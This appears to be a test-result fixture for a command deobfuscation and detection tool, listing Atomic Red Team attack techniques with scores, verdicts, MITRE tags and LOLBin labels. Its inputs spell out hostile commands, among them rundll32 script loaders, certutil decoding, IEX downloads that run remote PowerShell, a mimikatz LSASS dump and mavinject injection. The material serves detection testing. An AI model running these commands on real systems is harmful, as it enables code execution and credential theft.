@@ -1,0 +1,548 @@
+[
+  {
+    "name": "T1055.011 \u00b7 Process Injection via Extra Window Memory (EWM) x6",
+    "source": "T1055.011",
+    "input": "test.value",
+    "input_len": 10,
+    "engine": "magic",
+    "chain": [],
+    "score": 60,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1218.011 \u00b7 Rundll32 execute JavaScript Remote Payload With Ge",
+    "source": "T1218.011",
+    "input": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:test.value\").Exec();window.close();",
+    "input_len": 127,
+    "engine": "archetype:LOLBAS_RUNDLL32_JAVASCRIPT+magic",
+    "chain": [
+      "rundll32-annotate",
+      "extract-payload"
+    ],
+    "score": 45,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1218.011",
+      "T1218.005"
+    ],
+    "lolbins": [
+      "rundll32.exe"
+    ],
+    "output": "Rundll32JavaScript/HTMLApplicationLoaderDetected",
+    "post_proc": []
+  },
+  {
+    "name": "T1218.011 \u00b7 Rundll32 execute VBscript command",
+    "source": "T1218.011",
+    "input": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"test.value\"),0)",
+    "input_len": 108,
+    "engine": "archetype:LOLBAS_RUNDLL32_JAVASCRIPT+magic",
+    "chain": [
+      "rundll32-annotate",
+      "extract-payload"
+    ],
+    "score": 45,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1218.005"
+    ],
+    "lolbins": [
+      "rundll32.exe"
+    ],
+    "output": "Rundll32JavaScript/HTMLApplicationLoaderDetected",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.013 \u00b7 Decode Eicar File and Write to File",
+    "source": "T1027.013",
+    "input": "$encodedString = \"WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=\"\n$bytes = [System.Convert]::FromBase64String($encodedString)\n$decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)\n#write the decoded eicar string to file\n$decodedString | Out-File $env:temp\\T1027.013_decodedEicar.txt",
+    "input_len": 338,
+    "engine": "archetype:PS_FROMBASE64_ASCII_INDIRECT",
+    "chain": [
+      "extract-b64-via-var",
+      "ascii-decode"
+    ],
+    "score": 100,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1082",
+      "T1140"
+    ],
+    "lolbins": [
+      "write.exe"
+    ],
+    "output": "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
+    "post_proc": []
+  },
+  {
+    "name": "T1140 \u00b7 Deobfuscate/Decode Files Or Information",
+    "source": "T1140",
+    "input": "certutil -encode test.value %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe",
+    "input_len": 118,
+    "engine": "archetype:CERTUTIL_DOWNLOAD_DECODE_WORKFLOW",
+    "chain": [
+      "certutil-annotate"
+    ],
+    "score": 100,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1140"
+    ],
+    "lolbins": [
+      "certutil.exe"
+    ],
+    "output": "# --- Certutil LOLBAS Workflow Detected ---\n# T1140 \u00b7 Decode/Deobfuscate (certutil -decode)\n# T1027 \u00b7 Obfuscated File Info (certutil -encode)\ncertutil -encode test.value %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe",
+    "post_proc": []
+  },
+  {
+    "name": "T1140 \u00b7 Certutil Rename and Decode",
+    "source": "T1140",
+    "input": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode test.value %temp%\\T1140_calc2.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe",
+    "input_len": 184,
+    "engine": "archetype:CERTUTIL_DOWNLOAD_DECODE_WORKFLOW+smart",
+    "chain": [
+      "certutil-annotate",
+      "env-expand"
+    ],
+    "score": 64,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1140",
+      "T1074.001"
+    ],
+    "lolbins": [
+      "certutil.exe"
+    ],
+    "output": "# --- Certutil LOLBAS Workflow Detected ---\n# T1140 \u00b7 Decode/Deobfuscate (certutil -decode)\n# T1027 \u00b7 Obfuscated File Info (certutil -encode)\ncopy C:\\Windows\\system32\\certutil.exe C:\\Users\\Public\\AppData\\Local\\Temp\\tcm.tmp\nC:\\Users\\Public\\AppData\\Local\\Temp\\tcm.tmp -encode test.value C:\\Users\\Public\\AppData\\Local\\Temp\\T1140_calc2.txt\nC:\\Users\\Public\\AppData\\Local\\Temp\\tcm.tmp -decode C:\\Users\\Public\\AppData\\Local\\Temp\\T1140_calc2.txt C:\\Users\\Public\\AppData\\Local\\Temp\\T1140_calc2_decoded.exe",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.003 \u00b7 Thread Execution Hijacking",
+    "source": "T1055.003",
+    "input": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"\nStart-Sleep -Seconds 5\nStop-Process $notepad.id",
+    "input_len": 159,
+    "engine": "magic",
+    "chain": [],
+    "score": 72,
+    "verdict": "Undecoded",
+    "mitre": [
+      "T1204.002",
+      "T1059.001"
+    ],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1055 \u00b7 Shellcode execution via VBA",
+    "source": "T1055",
+    "input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"test.value\" -officeProduct \"Word\" -sub \"Execute\"",
+    "input_len": 292,
+    "engine": "magic",
+    "chain": [],
+    "score": 100,
+    "verdict": "Malicious",
+    "mitre": [
+      "T1105",
+      "T1059.001",
+      "T1102",
+      "T1566.001"
+    ],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1055 \u00b7 Remote Process Injection in LSASS via mimikatz",
+    "source": "T1055",
+    "input": "\"test.value\" /accepteula \\\\test.value -c test.value \"lsadump::lsa /inject /id:500\" \"exit\"",
+    "input_len": 89,
+    "engine": "reasoning",
+    "chain": [
+      "xor"
+    ],
+    "score": 59,
+    "verdict": "Suspicious",
+    "mitre": [],
+    "lolbins": [],
+    "output": "l:+=:`8/\";+lna/--+>:+;\"/n\u0012\u0012:+=:`8/\";+nc-n:+=:`8/\";+nl\"=/*;#>tt\"=/na' $+-:na'*t{~~lnl+6':l",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.001 \u00b7 Pad Binary to Change Hash - Linux/macOS dd",
+    "source": "T1027.001",
+    "input": "dd if=/dev/zero bs=1 count=1 >> test.value #adds null bytes\ndd if=/dev/random bs=1 count=1 >> test.value #adds high-quality random data\ndd if=/dev/urandom bs=1 count=1 >> test.value #adds low-quality random data",
+    "input_len": 211,
+    "engine": "magic",
+    "chain": [],
+    "score": 52,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.001 \u00b7 Pad Binary to Change Hash using truncate command -",
+    "source": "T1027.001",
+    "input": "truncate -s +1 test.value #adds a byte to the file size",
+    "input_len": 55,
+    "engine": "magic",
+    "chain": [],
+    "score": 60,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.004 \u00b7 Process Injection via C#",
+    "source": "T1055.004",
+    "input": "\"test.value\"",
+    "input_len": 12,
+    "engine": "magic",
+    "chain": [],
+    "score": 60,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.004 \u00b7 EarlyBird APC Queue Injection in Go",
+    "source": "T1055.004",
+    "input": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"test.value\" -debug",
+    "input_len": 81,
+    "engine": "smart",
+    "chain": [
+      "js-unescape"
+    ],
+    "score": 52,
+    "verdict": "Suspicious",
+    "mitre": [],
+    "lolbins": [],
+    "output": "$PathToAtomicsFolder\\T1055.004\\bind\\EarlyBird.exe -program \"test.value\" -debug",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.002 \u00b7 Portable Executable Injection",
+    "source": "T1055.002",
+    "input": "Start-Process \"test.value\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
+    "input_len": 127,
+    "engine": "magic",
+    "chain": [],
+    "score": 77,
+    "verdict": "Undecoded",
+    "mitre": [
+      "T1057",
+      "T1059.001"
+    ],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.012 \u00b7 Process Hollowing using PowerShell",
+    "source": "T1055.012",
+    "input": ". \"test.value\"\n$ppid=Get-Process test.value | select -expand id\nStart-Hollow -Sponsor \"test.value\" -Hollow \"test.value\" -ParentPID $ppid -Verbose",
+    "input_len": 145,
+    "engine": "reasoning",
+    "chain": [
+      "xor"
+    ],
+    "score": 58,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1057"
+    ],
+    "lolbins": [
+      "Expand.exe"
+    ],
+    "output": "`nl:+=:`8/\";+lDj>>'*s\t+:c\u001e<!-+==n:+=:`8/\";+n2n=+\"+-:nc+6>/ *n'*D\u001d:/<:c\u0006!\"\"!9nc\u001d>! =!<nl:+=:`8/\";+lnc\u0006!\"\"!9nl:+=:`8/\";+lnc\u001e/<+ :\u001e\u0007\nnj>>'*nc\u0018+<,!=+",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.012 \u00b7 RunPE via VBA",
+    "source": "T1055.012",
+    "input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"test.value\" -sub \"Exploit\"",
+    "input_len": 346,
+    "engine": "magic",
+    "chain": [],
+    "score": 100,
+    "verdict": "Malicious",
+    "mitre": [
+      "T1105",
+      "T1059.001",
+      "T1102",
+      "T1566.001"
+    ],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1027 \u00b7 Decode base64 Data into Script",
+    "source": "T1027",
+    "input": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64decode -r\"; else cmd=\"base64 -d\"; fi;\ncat /tmp/encoded.dat | $cmd > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh",
+    "input_len": 156,
+    "engine": "magic",
+    "chain": [
+      "extract-payload",
+      "base64-decode"
+    ],
+    "score": 70,
+    "verdict": "Suspicious",
+    "mitre": [],
+    "lolbins": [],
+    "output": "\u00fe\u00d9\u00a9\u00fd\u00e9\u00dc\u00a1\u00d7\u009d",
+    "post_proc": []
+  },
+  {
+    "name": "T1027 \u00b7 Execute base64-encoded PowerShell",
+    "source": "T1027",
+    "input": "$OriginalCommand = 'test.value'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand",
+    "input_len": 213,
+    "engine": "magic",
+    "chain": [],
+    "score": 64,
+    "verdict": "Undecoded",
+    "mitre": [
+      "T1059.001"
+    ],
+    "lolbins": [
+      "powershell.exe"
+    ],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1218.010 \u00b7 Regsvr32 local COM scriptlet execution",
+    "source": "T1218.010",
+    "input": "test.value\\test.value /s /u /i:\"test.value\" scrobj.dll",
+    "input_len": 54,
+    "engine": "reasoning",
+    "chain": [
+      "xor"
+    ],
+    "score": 44,
+    "verdict": "Suspicious",
+    "mitre": [],
+    "lolbins": [
+      "Scrobj.dll"
+    ],
+    "output": "5$25o7 -4$\u001d5$25o7 -4$an2an4an({c5$25o7 -4$ca2\"3.#+o%--",
+    "post_proc": []
+  },
+  {
+    "name": "T1218.010 \u00b7 Regsvr32 remote COM scriptlet execution",
+    "source": "T1218.010",
+    "input": "test.value\\test.value /s /u /i:test.value scrobj.dll",
+    "input_len": 52,
+    "engine": "reasoning",
+    "chain": [
+      "xor",
+      "rot-n"
+    ],
+    "score": 44,
+    "verdict": "Suspicious",
+    "mitre": [],
+    "lolbins": [
+      "Scrobj.dll"
+    ],
+    "output": "5$25s7 -4$\u001d5$25s7 -4$er2er4er({5$25s7 -4$e2\"3.#+s%--",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.004 \u00b7 Compile After Delivery using csc.exe",
+    "source": "T1027.004",
+    "input": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:test.value \"test.value\"",
+    "input_len": 84,
+    "engine": "magic",
+    "chain": [],
+    "score": 59,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [
+      "csc.exe"
+    ],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.004 \u00b7 Dynamic C# Compile",
+    "source": "T1027.004",
+    "input": "Invoke-Expression \"test.value\"",
+    "input_len": 30,
+    "engine": "magic",
+    "chain": [],
+    "score": 88,
+    "verdict": "Undecoded",
+    "mitre": [
+      "T1059.001"
+    ],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.009 \u00b7 Inplace Instruction Overwrite",
+    "source": "T1055.009",
+    "input": "test.value",
+    "input_len": 10,
+    "engine": "magic",
+    "chain": [],
+    "score": 60,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.009 \u00b7 Instruction Overwrite Jump",
+    "source": "T1055.009",
+    "input": "test.value",
+    "input_len": 10,
+    "engine": "magic",
+    "chain": [],
+    "score": 60,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.006 \u00b7 HTML Smuggling Remote Payload",
+    "source": "T1027.006",
+    "input": "& \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html\"",
+    "input_len": 59,
+    "engine": "magic",
+    "chain": [],
+    "score": 52,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.002 \u00b7 Binary simply packed by UPX (linux)",
+    "source": "T1027.002",
+    "input": "cp test.value /tmp/packed_bin && /tmp/packed_bin",
+    "input_len": 48,
+    "engine": "magic",
+    "chain": [],
+    "score": 49,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.002 \u00b7 Binary packed by UPX, with modified headers (linux",
+    "source": "T1027.002",
+    "input": "cp test.value /tmp/packed_bin && /tmp/packed_bin",
+    "input_len": 48,
+    "engine": "magic",
+    "chain": [],
+    "score": 49,
+    "verdict": "Undecoded",
+    "mitre": [],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.018 \u00b7 File Masquerading with Zero-Width Space",
+    "source": "T1027.018",
+    "input": "$fileName = \"secret\" + [char]0x200B + \".txt\"\nNew-Item -Path \"$env:TEMP\\$fileName\" -ItemType \"file\" -Value \"Hidden Unicode Content\" -Force\nWrite-Host \"Created file: $env:TEMP\\$fileName\"",
+    "input_len": 184,
+    "engine": "smart",
+    "chain": [
+      "powershell-deobfuscate"
+    ],
+    "score": 54,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1082"
+    ],
+    "lolbins": [],
+    "output": "$fileName = \"secret\" + \u0000x200B + \".txt\"\nNew-Item -Path \"\\$fileName\" -ItemType \"file\" -Value \"Hidden Unicode Content\" -Force\nWrite-Host \"Created file: \\$fileName\"",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.018 \u00b7 Invisible Unicode in Environment Variables",
+    "source": "T1027.018",
+    "input": "$varName = \"PATH\" + [char]0x200C\n[Environment]::SetEnvironmentVariable($varName, \"C:\\Users\\Public\\Malicious\", \"User\")\nWrite-Host \"Hidden environment variable '$varName' set.\"",
+    "input_len": 174,
+    "engine": "smart",
+    "chain": [
+      "powershell-deobfuscate"
+    ],
+    "score": 49,
+    "verdict": "Suspicious",
+    "mitre": [],
+    "lolbins": [],
+    "output": "$varName = \"PATH\" + \u0000x200C\n[Environment]::SetEnvironmentVariable($varName, \"C:\\Users\\Public\\Malicious\", \"User\")\nWrite-Host \"Hidden environment variable '$varName' set.\"",
+    "post_proc": []
+  },
+  {
+    "name": "T1027.007 \u00b7 Dynamic API Resolution-Ninja-syscall",
+    "source": "T1027.007",
+    "input": "Start-Process \"test.value\"\nStart-Sleep -Seconds 7\nif (Test-Path \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\") { Remove-Item \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\" -Force; Write-Host \"[+] hello.log removed.\" }",
+    "input_len": 220,
+    "engine": "magic",
+    "chain": [],
+    "score": 65,
+    "verdict": "Undecoded",
+    "mitre": [
+      "T1059.001"
+    ],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.015 \u00b7 Process injection ListPlanting",
+    "source": "T1055.015",
+    "input": "Start-Process \"test.value\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
+    "input_len": 127,
+    "engine": "magic",
+    "chain": [],
+    "score": 77,
+    "verdict": "Undecoded",
+    "mitre": [
+      "T1057",
+      "T1059.001"
+    ],
+    "lolbins": [],
+    "output": "",
+    "post_proc": []
+  },
+  {
+    "name": "T1055.001 \u00b7 Process Injection via mavinject.exe",
+    "source": "T1055.001",
+    "input": "$mypid = test.value\nmavinject $mypid /INJECTRUNNING \"test.value\"\nStop-Process -processname notepad",
+    "input_len": 98,
+    "engine": "reasoning",
+    "chain": [
+      "xor"
+    ],
+    "score": 44,
+    "verdict": "Suspicious",
+    "mitre": [],
+    "lolbins": [
+      "Mavinject.exe"
+    ],
+    "output": "=tip}9$9m|jm7oxul|\u0013txopws|zm9=tip}96PWS\\ZMKLWWPW^9;m|jm7oxul|;\u0013Jmvi4Ikvz|jj94ikvz|jjwxt|9wvm|ix}",
+    "post_proc": []
+  }
+]
